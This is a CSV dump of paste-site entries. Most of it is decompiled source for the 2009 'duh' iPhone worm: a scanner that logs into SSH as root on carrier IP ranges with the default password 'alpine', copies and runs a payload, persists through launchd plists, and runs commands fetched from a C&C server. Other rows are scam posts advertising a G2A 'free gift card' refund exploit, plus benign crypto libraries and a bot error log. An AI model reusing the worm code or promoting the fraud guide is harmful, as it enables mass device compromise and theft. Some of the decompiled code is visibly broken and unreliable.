id,title,username,language,date,content
hhz6aLwj,Untitled,Cartes010,GetText,Monday 25th of March 2024 12:55:54 AM CDT,"Cheat Expired,Silahkan download yang terbaru."
7kFv7WkD,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Monday 25th of March 2024 12:24:40 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_607742.pdf

Working as of:
25 March 2024


















"
CqEN3QRB,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Monday 25th of March 2024 12:18:59 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
25 March 2024















































"
VQBefdSZ,ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None],basedcount_bot,Python,Monday 25th of March 2024 12:04:04 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 992, in _wrap_create_connection
    return await self._loop.create_connection(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1112, in create_connection
    transport, protocol = await self._create_connection_transport(
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1145, in _create_connection_transport
    await waiter
ConnectionAbortedError: SSL handshake is taking longer than 60.0 seconds: aborting the connection

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 46, in wrapper
    await func(lemmy_instance, databased)
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 228, in read_comments
    async for comment in lemmy_instance.stream_comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/async_lemmy.py"", line 64, in stream_comments
    comments = await self.request_builder.get(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/request_builder.py"", line 57, in get
    async with self.client_session.get(url, headers=headers, params=params) as resp:
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/client.py"", line 1194, in __aenter__
    self._resp = await self._coro
                 ^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/client.py"", line 578, in _request
    conn = await self._connector.connect(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 544, in connect
    proto = await self._create_connection(req, traces, timeout)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 911, in _create_connection
    _, proto = await self._create_direct_connection(req, traces, timeout)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1235, in _create_direct_connection
    raise last_exc
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1204, in _create_direct_connection
    transp, proto = await self._wrap_create_connection(
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1000, in _wrap_create_connection
    raise client_error(req.connection_key, exc) from exc
aiohttp.client_exceptions.ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None]
"
WWhMQJpe,worm/scripts/com.apple.ksyslog.plist,FlyFar,XML,Sunday 24th of March 2024 11:48:31 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple Computer//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
        <dict>
			<key>Label</key>
				<string>com.apple.ksyslog</string>
            <key>ProgramArguments</key>
            <array>
				<string>/private/var/mobile/home/sshd</string>
            </array>
            <key>RunAtLoad</key>
				<true/>
			<key>KeepAlive</key>
				<true/>
		</dict>
</plist>"
yRfTjxpk,worm/scripts/com.apple.period.plist,FlyFar,XML,Sunday 24th of March 2024 11:47:53 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple Computer//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
        <dict>
			<key>Label</key>
				<string>com.apple.period-aily</string>
            <key>ProgramArguments</key>
            <array>
				<string>/private/var/mobile/home/syslog</string>
            </array>
             <key>StartInterval</key>
				<integer>300</integer>
		</dict>
</plist>"
qxr7D3tp,worm/scripts/syslog,FlyFar,Bash,Sunday 24th of March 2024 11:46:05 PM CDT,"#!/bin/sh
cd /private/var/mobile/home/
ID=$(cat /etc/rel)  # Get bot client ID
PATH=.:$PATH
# invoke ""duh"" application - which checks in to C&C server with bot client ID
# The C&C server replies are stored in file .tmp, which is then interrogated for new commands
# via the check function
/private/var/mobile/home/duh SERVER /xml/p.php?id=$ID > /private/var/mobile/home/.tmp
check;

function check {
    if test 2 -lt $(wc -l .tmp | cut -d "" "" -f 1)
    then
	sh /private/var/mobile/home/.tmp
    fi
}"
a08WPnsP,worm/duh.c,FlyFar,C,Sunday 24th of March 2024 11:45:24 PM CDT,"#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netdb.h>
#include <string.h>

int create_tcp_socket();
char *get_ip(char *host);
char *build_get_query(char *host, char *page);
void usage();

#define HOST ""127.0.0.1""
#define PAGE ""/""
#define PORT 80
#define USERAGENT ""HTMLGET 1.0""

int main(int argc, char **argv)
{
  struct sockaddr_in *remote;
  int sock;
  int tmpres;
  char *ip;
  char *get;
  char buf[BUFSIZ+1];
  char *host;
  char *page;

  host = argv[1];
  if(argc > 2){
    page = argv[2];
  }else{
    page = PAGE;
  }
  sock = create_tcp_socket();
  ip = get_ip(host);
  remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
  remote->sin_family = AF_INET;
  tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr)));
  if( tmpres < 0)  
  {
    perror(""Can't set remote->sin_addr.s_addr"");
    exit(1);
  }else if(tmpres == 0)
  {
    fprintf(stderr, ""%s is not a valid IP address\n"", ip);
    exit(1);
  }
  remote->sin_port = htons(PORT);

  if(connect(sock, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0){
    perror(""Could not connect"");
    exit(1);
  }
  get = build_get_query(host, page);
  
  
  int sent = 0;
  while(sent < strlen(get))
  { 
    tmpres = send(sock, get+sent, strlen(get)-sent, 0);
    if(tmpres == -1){
      perror(""Can't send query"");
      exit(1);
    }
    sent += tmpres;
  }
                   
  memset(buf, 0, sizeof(buf));
  int htmlstart = 0;
  char * htmlcontent;
  while((tmpres = recv(sock, buf, BUFSIZ, 0)) > 0){
    if(htmlstart == 0)
    {
      htmlcontent = strstr(buf, ""\r\n\r\n"");
      if(htmlcontent != NULL){
        htmlstart = 1;
        htmlcontent += 4;
      }
    }else{
      htmlcontent = buf;
    }
    if(htmlstart){
      fprintf(stdout, htmlcontent);
    }
 
    memset(buf, 0, tmpres);
  }
  if(tmpres < 0)
  {
    perror(""Error receiving data"");
  }
  free(get);
  free(remote);
  free(ip);
  close(sock);
  return 0;
}

int create_tcp_socket()
{
  int sock;
  if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){
    perror(""Can't create TCP socket"");
    exit(1);
  }
  return sock;
}


char *get_ip(char *host)
{
  struct hostent *hent;
  int iplen = 15;
  char *ip = (char *)malloc(iplen+1);
  memset(ip, 0, iplen+1);
  if((hent = gethostbyname(host)) == NULL)
  {
    herror(""Can't get IP"");
    exit(1);
  }
  if(inet_ntop(AF_INET, (void *)hent->h_addr_list[0], ip, iplen) == NULL)
  {
    perror(""Can't resolve host"");
    exit(1);
  }
  return ip;
}

char *build_get_query(char *host, char *page)
{
  char *query;
  char *getpage = page;
  char *tpl = ""GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n"";
  if(getpage[0] == '/'){
    getpage = getpage + 1;
  }
  
  query = (char *)malloc(strlen(host)+strlen(getpage)+strlen(USERAGENT)+strlen(tpl)-5);
  sprintf(query, tpl, getpage, host, USERAGENT);
  return query;
}"
PXBY8pmU,worm/sshd.c,FlyFar,C,Sunday 24th of March 2024 11:43:05 PM CDT,"/* 
   This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2015 Hex-Rays <info@hex-rays.com>

   Detected compiler: GNU C++
   
   /// NOTE ///
   As you can see, the 'duh' worm of 2009 is just another
   iKee variant, the decompiled code is VERY much the exact same
   except that debug messages were mostly removed, and the infection
   routine was modified...
   /// END ///
*/

#include ""sshd.h""

int fdlock;

//----- (00001984) --------------------------------------------------------
char *randHost() // Generates a random SubNet to scan...
{
  char *retme;
  int x = random() % 255;
  int y = random() % 255;
  int z = random() % 255;

  srand(time(0));
  asprintf(&retme, ""%i.%i.%i."", x, y, z);
  return retme;
}

//----- (00001A80) --------------------------------------------------------
int get_lock(void) // Sets/Gets the status of the file lock located in /var/lock/ssh.lock
{
    struct flock fl;
    fl.l_type = F_WRLCK;
    fl.l_whence = SEEK_SET;
    fl.l_start = 0;
    fl.l_len = 1;
    if((fdlock = open(""/var/lock/ssh.lock"", O_WRONLY|O_CREAT, 0666)) == -1)
      return 0;
    if(fcntl(fdlock, F_SETLK, &fl) == -1)
      return 0;
    return 1;
}

//----- (00001B70) --------------------------------------------------------
char *getAddrRange()
{
  struct ifaddrs, *ifaddr, *ifa;
  int family, s;
  char host[NI_MAXHOST];]

  if (getifaddrs(&ifaddr) == -1) {
    perror(""getifaddrs"");
    exit(EXIT_FAILURE);
  }
  for (ifa = ifaddr; ifa != NULL; i = ifa->ifa_next) {
    family = ifa->ifa_addr->sa_family;
    if (family == AF_INET || family == AF_INET6)
    {
      s = getnameinfo(ifa->ifa_addr,(family == AF_INET) ? sizeof(struct sockaddr_in): sizeof(struct sockaddr_in6), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
      if (s != 0) {
        printf(""getnameinfo() failed: %s\n"", gai_strerror(s));
        return ""0.0.0.0-0.0.0.0"";
      }
      if (!strcmp(ifa->ifa_name, ""pdp_ip0"")) {
      	char *wee[20];
        tokenise(host, wee, ""."");
        int octc = atoi(wee[2]);
        asprintf((char*)&range, ""%s.%s.%i.0-%s.%s.%i.255"", wee[0], wee[1], octc, wee[0], wee[1], octc+2);
        return (char*)range;
      }
    }
  }
  freeifaddrs(ifaddr);
  return ""0.0.0.0-0.0.0.0"";
}

//----- (00001DB4) --------------------------------------------------------
int tokenise(char *input[], char *token[], char *spl)
{
  char *tokens;
  int count = 0;
  
  tokens = strtok(input, spl);
  
  if(tokens[strlen(tokens)-1] == '\n') tokens[strlen(tokens)-1] = '\0';
  token[count] = tokens;
  while(tokens != NULL) {
  	count++;
  	if(count > 4096) return (-1);
  	tokens = strtok(NULL, spl);
  	if(tokens != NULL) {
  		if(tokens[strlen(tokens)-1] == '\n') tokens[strlen(tokens)-1] = '\0';
	  }
	token[count] = tokens;
  }
  return count;
}

//----- (00001F1C) --------------------------------------------------------
int main() {
  if (get_lock()) {
    sleep(60);
    char *ipRanges[] = { getAddrRange(), 				// Local Net
    					 ""94.157.100.0-94.157.255.255"", // T-mobile, Netherlands
    					 ""87.103.52.255-87.103.66.255"", // Vodafone, Portugal
    					 ""94.157.0.0.0-120.157.99.255"", // T-mobile, Netherlands
    					 ""114.72.0.0-114.75.255.255"", 	// OPTUSINTERNET, Australia
    					 ""92.248.90.0-92.248.120.255"",	// MOBILKOM, Austria
    					 ""81.217.74.0-81.217.74.255"",	// Kabelsignal AG, Austria
    					 ""84.224.60.0-84.224.80.255"",	// Pannon GSM Telecommunications Inc, Hungary
    					 ""188.88.100.0-188.88.160.255"",	// T-mobile, Netherlands
    					 ""77.248.140.0-77.248.146.255"",	// UPC broadband, Austria
    					 ""77.54.160.0-77.54.190.255"",	// Vodafone, Portugal
    					 ""80.57.116.0-80.57.131.255"",	// UPC broadband, Austria
    					 ""84.224.0.0-84.224.63.255"" };	// Pannon GSM Telecommunications Inc, Hungary
    while(1) {
      for(int j = 0; j < sizeof(ipRanges); ++j) {
      	scanner(ipRanges[j]);
      	for (int k = 0; k <= 2; ++k) {
          randSubNet = randHost();
          char *zeRange;
          asprintf(&zeRange, ""%s.0-%s.255"", randSubNet, randSubNet);
          scanner(zeRange);
      }
    }
  }
  return 1;
}

//----- (00002110) --------------------------------------------------------
void scanner(char *ipRange)
{
    char *wee[10];
    char *begin[10];
    char *end[10];
    tokenise(ipRange, wee, ""-"");
    int octaB, octaE, octbB, octbE, octcB, octcE;
    tokenise(wee[0], begin, ""."");
    tokenise(wee[1], end, ""."");
    octaB = atoi(begin[0]);
    octaE = atoi(end[0]);
    octbB = atoi(begin[1]);
    octbE = atoi(end[1]);
    octcB = atoi(begin[2]);
    octcE = atoi(end[2]);
    
    for (int loop1=octaB; loop1<=octaE; loop1++)
    {
        for (int loop2=octbB; loop2<=octbE; loop2++)
        {
            for (int loop3=octcB; loop3<=octcE; loop3++)
            {
                for (int loop4=0; loop4<=255; loop4++)
                {
                    char* host;
                    asprintf(&host, ""%i.%i.%i.%i"", loop1, loop2, loop3, loop4);
                    if (!scanHost(host) && !checkHost(host))
                    {
                        initfst(host);
                    }
                }
            }
        }
    }
}

//----- (00002314) --------------------------------------------------------
int scanHost(char* host)
{
    int res, valopt, soc;
    struct sockaddr_in addr;
    long arg;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    soc = socket(AF_INET, SOCK_STREAM, 0);
    arg = fcntl(soc, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(soc, F_SETFL, arg);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(22);
    addr.sin_addr.s_addr = inet_addr(host);
    res = connect(soc, (struct sockaddr *)&addr, sizeof(addr));
    if (res < 0) {
      if (errno == EINPROGRESS) {
        tv.tv_sec = 10;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(soc, &myset);
        if (select(soc+1, NULL, &myset, NULL, &tv) > 0) {
            lon = sizeof(int);
            getsockopt(soc, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
            if (valopt) {
              return -1;
            }
        }
        else {
            return -1; }
      }
      else { return -1; }
    }
    close(soc);
    return 0;
}

//----- (000024E0) --------------------------------------------------------
int checkHost(char *host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    syslog(LOG_DEBUG, ""%s"", host); // One of the few times he decides to call a SYSLOG.
    asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s 'echo 99'"", VULN_PASS, host);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, 2, in) != NULL) {
        	if (strcmp(buff, ""99""))
            	return 0;
    	}
    }
    pclose(in);
    return -1; // NOT VULN
}

//----- (000025DC) --------------------------------------------------------
int runCommand(char* command, char *host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s '%s ; echo 99'"", VULN_PASS, host, command);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, 2, in) != NULL) {
        	if (strcmp(buff, ""99"")) return 0;
    	}
    }
    pclose(in);
    return -1;
}

//----- (000026D8) --------------------------------------------------------
int prunCommand(char* command, char *host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s '%s'"", VULN_PASS, host, command);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, sizeof(buff), in) != NULL) {
        	printf(""%s"", buff);
    	}
    }
    pclose(in);
    return -1;
}

//----- (000027BC) --------------------------------------------------------
int CopyFile(char* src, char* dst, char* host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    asprintf(&execLine, ""sshpass -p %s scp -o StrictHostKeyChecking=no ./%s root@%s:%s"", VULN_PASS, src, host, dst);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, sizeof(buff), in) != NULL) {}
    	asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s 'which %s'"", VULN_PASS, host, dst);
    	if (in = popen(execLine, ""r"")) {
    		while (fgets(buff, 2, in) != NULL ) {
        		if (strcmp(buff, dst))
            		return 0;
    		}
    		return -1;
    	}
    	return -1;
    }
    pclose(in);
    return -1;
}

//----- (0000294C) --------------------------------------------------------
int initfst(char *host) {
  if (!runCommand(""mkdir /private/var/mobile/home"", host))
  {
    if (!CopyFile(""/private/var/mobile/home/cydia.tgz"", ""/private/var/mobile/home/cydia.tgz"", host))
    	prunCommand(""cd /private/var/mobile/home/;tar xzf cydia.tgz;./inst"", host);
  }
  return 0;
}"
k9TUqb9G,worm/sshd.h,FlyFar,C,Sunday 24th of March 2024 11:37:54 PM CDT,"#include <sys/fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <syslog.h>
#include <errno.h>
#include <ifaddrs.h>
#include <string.h>

#define VULN_PASS ""alpine""

void scanner(char *ipRange);
int scanHost(char* host);
int checkHost(char *host);
int runCommand(char* command, char *host);
int prunCommand(char* command, char *host);
int CopyFile(char* src, char* dst, char* host);
int infectHost(char *host);
char *randHost(void);
int get_lock(void);
char *getAddrRange();
int tokenise (char input[], char *token[], char* spl);"
81gczWE4,libs/ChaCha20/chacha20.h,FlyFar,C++,Sunday 24th of March 2024 11:31:30 PM CDT,"#ifndef __CHACHA20_H
#define __CHACHA20_H
#include <stdint.h>

void ChaCha20XOR(uint8_t key[32], uint32_t counter, uint8_t nonce[12], uint8_t *input, uint8_t *output, int inputlen);

#endif"
QFsm9Lyg,libs/ChaCha20/chacha20.cpp,FlyFar,C++,Sunday 24th of March 2024 11:30:36 PM CDT,"#include <stdint.h>
#include <string.h>
#include ""chacha20.h""

static inline void u32t8le(uint32_t v, uint8_t p[4]) {
    p[0] = v & 0xff;
    p[1] = (v >> 8) & 0xff;
    p[2] = (v >> 16) & 0xff;
    p[3] = (v >> 24) & 0xff;
}

static inline uint32_t u8t32le(uint8_t p[4]) {
    uint32_t value = p[3];

    value = (value << 8) | p[2];
    value = (value << 8) | p[1];
    value = (value << 8) | p[0];

    return value;
}

static inline uint32_t rotl32(uint32_t x, int n) {
    // http://blog.regehr.org/archives/1063
    return x << n | (x >> (-n & 31));
}

// https://tools.ietf.org/html/rfc7539#section-2.1
static void chacha20_quarterround(uint32_t *x, int a, int b, int c, int d) {
    x[a] += x[b]; x[d] = rotl32(x[d] ^ x[a], 16);
    x[c] += x[d]; x[b] = rotl32(x[b] ^ x[c], 12);
    x[a] += x[b]; x[d] = rotl32(x[d] ^ x[a],  8);
    x[c] += x[d]; x[b] = rotl32(x[b] ^ x[c],  7);
}

static void chacha20_serialize(uint32_t in[16], uint8_t output[64]) {
    int i;
    for (i = 0; i < 16; i++) {
        u32t8le(in[i], output + (i << 2));
    }
}

static void chacha20_block(uint32_t in[16], uint8_t out[64], int num_rounds) {
    int i;
    uint32_t x[16];

    memcpy(x, in, sizeof(uint32_t) * 16);

    for (i = num_rounds; i > 0; i -= 2) {
        chacha20_quarterround(x, 0, 4,  8, 12);
        chacha20_quarterround(x, 1, 5,  9, 13);
        chacha20_quarterround(x, 2, 6, 10, 14);
        chacha20_quarterround(x, 3, 7, 11, 15);
        chacha20_quarterround(x, 0, 5, 10, 15);
        chacha20_quarterround(x, 1, 6, 11, 12);
        chacha20_quarterround(x, 2, 7,  8, 13);
        chacha20_quarterround(x, 3, 4,  9, 14);
    }

    for (i = 0; i < 16; i++) {
        x[i] += in[i];
    }

    chacha20_serialize(x, out);
}

// https://tools.ietf.org/html/rfc7539#section-2.3
static void chacha20_init_state(uint32_t s[16], uint8_t key[32], uint32_t counter, uint8_t nonce[12]) {
    int i;

    // refer: https://dxr.mozilla.org/mozilla-beta/source/security/nss/lib/freebl/chacha20.c
    // convert magic number to string: ""expand 32-byte k""
    s[0] = 0x61707865;
    s[1] = 0x3320646e;
    s[2] = 0x79622d32;
    s[3] = 0x6b206574;

    for (i = 0; i < 8; i++) {
        s[4 + i] = u8t32le(key + i * 4);
    }

    s[12] = counter;

    for (i = 0; i < 3; i++) {
        s[13 + i] = u8t32le(nonce + i * 4);
    }
}

void ChaCha20XOR(uint8_t key[32], uint32_t counter, uint8_t nonce[12], uint8_t *in, uint8_t *out, int inlen) {
    int i, j;

    uint32_t s[16];
    uint8_t block[64];

    chacha20_init_state(s, key, counter, nonce);

    for (i = 0; i < inlen; i += 64) {
        chacha20_block(s, block, 20);
        s[12]++;

        for (j = i; j < i + 64; j++) {
            if (j >= inlen) {
                break;
            }
            out[j] = in[j] ^ block[j - i];
        }
    }
}"
AxcTKymC,libs/SHA256/sha256.h,FlyFar,C++,Sunday 24th of March 2024 11:26:38 PM CDT,"/*
*   SHA-256 implementation.
*
*   Copyright (c) 2010 Ilya O. Levin, http://www.literatecode.com
*
*   Permission to use, copy, modify, and distribute this software for any
*   purpose with or without fee is hereby granted, provided that the above
*   copyright notice and this permission notice appear in all copies.
*
*   THE SOFTWARE IS PROVIDED ""AS IS"" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
*   WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
*   MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
*   ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
*   WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
*   ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
*   OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
#ifdef _MSC_VER
#ifndef uint8_t
typedef unsigned __int8 uint8_t;
#endif
#ifndef uint32_t
typedef unsigned __int32 uint32_t;
#endif
#ifndef uint64_t
typedef __int64 int64_t;
typedef unsigned __int64 uint64_t;
#endif
#else
#include <stdint.h>
#endif

#ifdef __cplusplus
extern ""C""
{
#endif

   typedef struct {
       uint32_t buf[16];
       uint32_t hash[8];
       uint32_t len[2];
   } sha256_context;

   void sha256_init(sha256_context *);
   void sha256_hash(sha256_context *, uint8_t * /* data */, uint32_t /* len */);
   void sha256_done(sha256_context *, uint8_t * /* hash */);
   void sha256(uint8_t *output, uint8_t *input, int inlen);

#ifdef __cplusplus
}
#endif"
QEcigJn2,libs/SHA256/sha256.cpp,FlyFar,C++,Sunday 24th of March 2024 11:25:56 PM CDT,"/*
*   SHA-256 implementation.
*
*   Copyright (c) 2010 Ilya O. Levin, http://www.literatecode.com
*
*   Permission to use, copy, modify, and distribute this software for any
*   purpose with or without fee is hereby granted, provided that the above
*   copyright notice and this permission notice appear in all copies.
*
*   THE SOFTWARE IS PROVIDED ""AS IS"" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
*   WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
*   MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
*   ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
*   WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
*   ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
*   OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
#define SWAP_BYTES
// #define USE_STD_MEMCPY

#ifdef USE_STD_MEMCPY
#include <string.h>
#endif
#include ""sha256.h""

#ifdef __cplusplus
extern ""C"" {
#endif

#define RL(x,n)   (((x) << n) | ((x) >> (32 - n)))
#define RR(x,n)   (((x) >> n) | ((x) << (32 - n)))

#define S0(x)  (RR((x), 2) ^ RR((x),13) ^ RR((x),22))
#define S1(x)  (RR((x), 6) ^ RR((x),11) ^ RR((x),25))
#define G0(x)  (RR((x), 7) ^ RR((x),18) ^ ((x) >> 3))
#define G1(x)  (RR((x),17) ^ RR((x),19) ^ ((x) >> 10))

#ifdef SWAP_BYTES
#define BSWP(x,y)  _bswapw((uint32_t *)(x), (uint32_t)(y))
#else
#define BSWP(p,n)
#endif
#ifdef USE_STD_MEMCPY
#define MEMCP(x,y,z) memcpy((x),(y),(z))
#else
#define MEMCP(x,y,z) _memcp((x),(y),(z))
#endif

#ifndef __cdecl
#define __cdecl
#endif

static const uint32_t K[64] = {
     0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
     0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
     0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
     0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
     0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
     0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
     0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
     0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
     0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
     0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
     0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
     0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
     0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
     0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
     0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
     0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
};

/* -------------------------------------------------------------------------- */
static void _bswapw(uint32_t *p, uint32_t i)
{
    while (i--) p[i] = (RR(p[i],24) & 0x00ff00ff) | (RR(p[i],8) & 0xff00ff00);

} /* _bswapw */

/* -------------------------------------------------------------------------- */
#ifndef USE_STD_MEMCPY
void * __cdecl _memcp (void *d, const void *s, uint32_t sz)
{
    void *rv = d;

    while (sz--) *(char *)d = *(char *)s, d = (char *)d + 1,  s = (char *)s + 1;

    return(rv);
} /* _memcp */
#endif

/* -------------------------------------------------------------------------- */
static void _rtrf(uint32_t *b, uint32_t *p, uint32_t i, uint32_t j)
{
    #define B(x, y) b[(x-y) & 7]
    #define P(x, y) p[(x+y) & 15]

    B(7,i) += (j ? (p[i & 15] += G1(P(i,14)) + P(i,9) + G0(P(i,1))) : p[i & 15])
              + K[i+j] + S1(B(4,i))
              + (B(6,i) ^ (B(4,i) & (B(5,i) ^ B(6,i))));
    B(3,i) += B(7,i);
    B(7,i) += S0(B(0,i)) + ( (B(0,i) & B(1,i)) | (B(2,i) & (B(0,i) ^ B(1,i))) );

    #undef P
    #undef B
} /* _rtrf */

/* -------------------------------------------------------------------------- */
static void _hash(sha256_context *ctx)
{
    uint32_t b[8], *p, j;

    b[0] = ctx->hash[0]; b[1] = ctx->hash[1]; b[2] = ctx->hash[2];
    b[3] = ctx->hash[3]; b[4] = ctx->hash[4]; b[5] = ctx->hash[5];
    b[6] = ctx->hash[6]; b[7] = ctx->hash[7];

    for (p = ctx->buf, j = 0; j < 64; j += 16)
        _rtrf(b, p,  0, j), _rtrf(b, p,  1, j), _rtrf(b, p,  2, j),
        _rtrf(b, p,  3, j), _rtrf(b, p,  4, j), _rtrf(b, p,  5, j),
        _rtrf(b, p,  6, j), _rtrf(b, p,  7, j), _rtrf(b, p,  8, j),
        _rtrf(b, p,  9, j), _rtrf(b, p, 10, j), _rtrf(b, p, 11, j),
        _rtrf(b, p, 12, j), _rtrf(b, p, 13, j), _rtrf(b, p, 14, j),
        _rtrf(b, p, 15, j);

    ctx->hash[0] += b[0]; ctx->hash[1] += b[1]; ctx->hash[2] += b[2];
    ctx->hash[3] += b[3]; ctx->hash[4] += b[4]; ctx->hash[5] += b[5];
    ctx->hash[6] += b[6]; ctx->hash[7] += b[7];

} /* _hash */

/* -------------------------------------------------------------------------- */
void sha256_init(sha256_context *ctx)
{
    ctx->len[0] = ctx->len[1] = 0;
    ctx->hash[0] = 0x6a09e667; ctx->hash[1] = 0xbb67ae85;
